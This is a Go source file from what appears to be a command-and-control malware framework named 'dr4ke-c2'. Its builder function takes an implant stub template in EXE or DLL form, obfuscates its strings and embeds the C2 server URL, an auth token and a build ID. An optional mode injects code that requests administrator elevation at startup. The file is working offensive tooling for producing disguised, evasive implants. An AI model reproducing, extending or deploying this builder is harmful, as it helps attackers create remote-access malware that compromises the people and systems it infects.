package builder

import (
	"dr4ke-c2/server/utils"
	"fmt"
	"io/ioutil"
	"path/filepath"
	"strings"
)

func PrepareTemplate(destDir string, options BuildOptions) error {
	utils.LogOutput("[BUILDER] Preparing template in %s", destDir)

	var templatePath string
	var outputFileName string

	if options.OutputFormat == "dll" {
		templatePath = filepath.Join("builder", "template", "dll", "dll.go")
		outputFileName = "main.go"
		utils.LogOutput("[BUILDER] Using DLL template")
	} else {
		templatePath = filepath.Join("builder", "template", "stub.go")
		outputFileName = "main.go"
		utils.LogOutput("[BUILDER] Using EXE template")
	}

	utils.LogOutput("[BUILDER] Reading template from: %s", templatePath)
	data, err := ioutil.ReadFile(templatePath)
	if err != nil {
		utils.LogOutput("[BUILDER] Error reading template: %v", err)
		return fmt.Errorf("failed to read template: %v", err)
	}
	content := string(data)

	utils.LogOutput("[BUILDER] Applying string obfuscation...")
	obfuscator := NewStringObfuscator()
	content = obfuscator.ObfuscateTemplate(content)

	utils.LogOutput("[BUILDER] Replacing URL_REPLACE with: %s", options.ServerURL)
	content = strings.Replace(content, "URL_REPLACE", options.ServerURL, 1)
	tokenLog := options.AuthToken
	if len(tokenLog) > 5 {
		tokenLog = tokenLog[:5] + "....."
	}
	utils.LogOutput("[BUILDER] Replacing TOKEN_REPLACE with token (first 5 chars): %s", tokenLog)
	content = strings.Replace(content, "TOKEN_REPLACE", options.AuthToken, 1)
	utils.LogOutput("[BUILDER] Replacing BUILD_ID_REPLACE with: %s", options.OutputName)
	content = strings.Replace(content, "BUILD_ID_REPLACE", options.OutputName, 1)

	if options.UACMode && options.OutputFormat != "dll" {
		utils.LogOutput("[BUILDER] UAC mode enabled, adding UAC check at startup")
		content = strings.Replace(content, "func main() {", `func main() {
	if runtime.GOOS == "windows" && !IsAdmin() {
		fmt.Println("Requesting administrative privileges...")
		ElevateProcess()
		os.Exit(0)
	}`, 1)
	} else {
		if options.OutputFormat == "dll" {
			utils.LogOutput("[BUILDER] UAC mode skipped (DLL format)")
		} else {
			utils.LogOutput("[BUILDER] UAC mode disabled, skipping UAC check")
		}
	}
	outputPath := filepath.Join(destDir, outputFileName)
	utils.LogOutput("[BUILDER] Writing modified template to: %s", outputPath)
	if err := ioutil.WriteFile(outputPath, []byte(content), 0644); err != nil {
		utils.LogOutput("[BUILDER] Error writing modified template: %v", err)
		return fmt.Errorf("failed to write modified template: %v", err)
	}

	utils.LogOutput("[BUILDER] Template preparation complete.")
	return nil
}
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
